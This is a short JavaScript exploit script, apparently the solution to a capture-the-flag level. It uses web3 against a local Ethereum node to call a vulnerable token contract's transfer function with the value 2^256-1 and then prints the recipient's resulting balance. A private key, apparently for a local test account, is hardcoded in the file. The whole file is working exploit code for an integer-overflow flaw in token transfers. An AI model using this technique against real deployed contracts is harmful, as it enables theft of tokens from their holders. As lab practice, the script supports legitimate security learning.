// @format

const Web3 = require('web3');
const Tx = require('ethereumjs-tx');
const BigNumber = require('bignumber.js');

const token = require('./build/contracts/Token.json');

(async function pwn() {
  // Note that we're not using the deployment keys of the truffle here.
  var privateKey =
    'a3ade3bffea3a3af6c4fdcb7305a3f26a2baff5b97e2f061fadebb9215b6460b';
  var publicKey = '0x03e2edce4bb10110c3b75d14737100c0c34f7199';
  var publicKey2 = '0x51ad92b60df169b631b77bbe509938adff7acec9';

  const provider = new Web3.providers.HttpProvider('http://localhost:8545');
  const web3 = new Web3(provider);
  const networkId = await web3.eth.net.getId();
  const tokenAddress = token.networks[networkId].address;
  const tokenContract = new web3.eth.Contract(token.abi, tokenAddress);

  // I'm not sure what's the point of this level as you simple have to call
  // the flawed transfer function with a very large number.

  await tokenContract.methods
    .transfer(publicKey2, new BigNumber(2).pow(256).minus(1))
    .send({from: publicKey});
  const balance = await tokenContract.methods
    .balanceOf(publicKey2)
    .call({from: publicKey});
  console.log('Balance:', balance);
})();
